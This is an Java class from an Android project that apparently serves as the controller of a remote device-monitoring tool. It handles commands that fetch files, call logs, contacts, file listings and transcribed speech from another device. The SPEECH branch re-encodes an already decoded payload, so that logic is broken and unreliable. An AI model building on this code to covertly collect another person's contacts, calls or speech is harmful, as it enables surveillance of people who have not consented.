package com.aei.androidsecuritymasterapp;

import android.content.Context;
import android.speech.SpeechRecognizer;
import android.util.Log;

import com.aei.androidsecuritymasterapp.network.Command;
import com.aei.androidsecuritymasterapp.storage.StorageUtils;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;

public class ResponseHandler {

    interface ResponseHandlerCallbacks{
//        void onCallLog(List<CallLogUtils.Call> callLog);
//        void onContacts(List<ContactsUtils.Contact> contacts);
        void onFileList(List<String> files);
    }

    interface SpeechResponseCallback{
        void onSpeech(String words);
    }

    private SpeechResponseCallback onSpeech;
    private ResponseHandlerCallbacks callbacks;
    private Context context;

    public ResponseHandler(Context context){
        this.context = context;
    }

    public void setCallbacks(ResponseHandlerCallbacks callbacks){
        this.callbacks = callbacks;
    }

    public ResponseHandler setOnSpeech(SpeechResponseCallback onSpeech) {
        this.onSpeech = onSpeech;
        return this;
    }

    private void getFileList(String url, ResponseHandlerCallbacks callbacks){
        File fileListFile = new File(context.getCacheDir(),"files.json");
        new StorageUtils(url).downloadFile(fileListFile,file -> {
            try {
                FileReader fileReader = new FileReader(file);
                BufferedReader bufferedReader = new BufferedReader(fileReader);
                callbacks.onFileList(bufferedReader.lines().collect(Collectors.toList()));
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }
        });
    }

    public void handle(Command response){
        if(response.getPayload() != null)
            response.setPayload(new String(Base64.getDecoder().decode(response.getPayload().getBytes())));
        try {
            switch(response.getType()){
                case FILE:
                    new Downloader().download(context, response.getPayload(),"downloaded");
                    break;
                case LOG:
                case CONTACTS:
                    new Downloader().download(context, response.getPayload(),"downloaded.json");
                    break;
                case FILE_LIST:
                    getFileList(response.getPayload(),callbacks);
                    break;
                case SPEECH:
                    StringBuilder speechBuilder = new StringBuilder();
                    List<String> words = new Gson().fromJson(new String(Base64.getEncoder()
                            .encode(response.getPayload().getBytes())),
                            new TypeToken<List<String>>(){}.getType());
                    words.forEach(word->speechBuilder.append(word).append(" "));
                    onSpeech.onSpeech(speechBuilder.toString());
                default:
                    break;
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
